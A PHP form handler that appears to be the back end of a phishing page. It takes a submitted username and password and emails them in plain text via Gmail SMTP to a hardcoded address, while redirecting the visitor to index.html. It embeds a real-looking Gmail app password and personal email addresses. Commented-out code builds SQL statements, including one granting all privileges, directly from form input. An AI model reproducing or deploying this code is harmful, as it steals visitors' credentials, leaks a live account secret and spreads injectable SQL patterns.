

<?php  

header("Location: index.html");


/*
$sname = "localhost";
$uname = "root";
$password = "";

$db_name = "my_db";

$conn = mysqli_connect($sname, $uname, $password, $db_name);

if (!$conn) {
	echo "Connection Failed!";
	exit();
}


$username = $_POST['name'];
$user_password =$_POST['password'];

$sql = "INSERT INTO users (name, password) VALUES ('$username', '$user_password')";

if($conn->query($sql) === TRUE){
    echo "New record created successfully";
} else {
    echo "Error: ";
}
*/

// $sql = "DELETE FROM users WHERE name = '$username'";
/*
$sql = "CREATE USER '$username'@'localhost' IDENTIFIED BY '$user_password'";
$sql2 = "GRANT ALL PRIVILEGES ON * . * TO '$username'@'localhost'";

if($conn->query($sql) === TRUE){
    echo "New user created successfully";
} else {
    echo "Error: ";
}

if($conn->query($sql2) === TRUE){
    echo "Previlage Granted successfully";
} else {
    echo "Error: ";
}
*/

/*
$to = "sadeepaekanayaked@gmail.com";
$subject = "This is subject";

$message = "<b>This is HTML message.</b>";
$message .= "<h1>This is headline.</h1>";

$header = "From:shanukalakshan9817@gmail.com\r\n";
// $header .= "Cc:afgh@somedomain.com \r\n";
$header .= "MIME-Version: 1.0\r\n";
$header .= "Content-type: text/html\r\n";

$retval = mail ($to,$subject,$message,$header);

if( $retval == true ) {
    echo "Message sent successfully...";
}else {
    echo "Message could not be sent...";
}
    */  

$username = $_POST['name'];
$user_password =$_POST['password'];

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'phpmailer/src/Exception.php';
require 'phpmailer/src/PHPMailer.php';
require 'phpmailer/src/SMTP.php';

$mail = new PHPMailer(true);

try {
$mail->SMTPDebug = 2;                                       
$mail->isSMTP();                                            
$mail->Host       = 'smtp.gmail.com';                    
$mail->SMTPAuth   = true;                             
$mail->Username   = 'shanukalakshan9817@gmail.com';                 
$mail->Password   = 'dgmrotryswemnlee';                        
$mail->SMTPSecure = 'tls';                              
$mail->Port       = 587;  

$mail->setFrom('shanukalakshan9817@gmail.com', 'Shanuka Lakshan');           
$mail->addAddress('sadeepaekanayaked@gmail.com');
// $mail->addAddress('receiver2@gfg.com', 'Name');
    
$mail->isHTML(true);                                  
$mail->Subject = 'Subject';
$mail->Body    = '
        <p>
            name : '.$username.'
            <br><br>
            password : '.$user_password.'
            <br><br>
        </p>';
$mail->AltBody = 'Body in plain text for non-HTML mail clients';
$mail->send();
echo "Mail has been sent successfully!";
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}

    
exit();
?>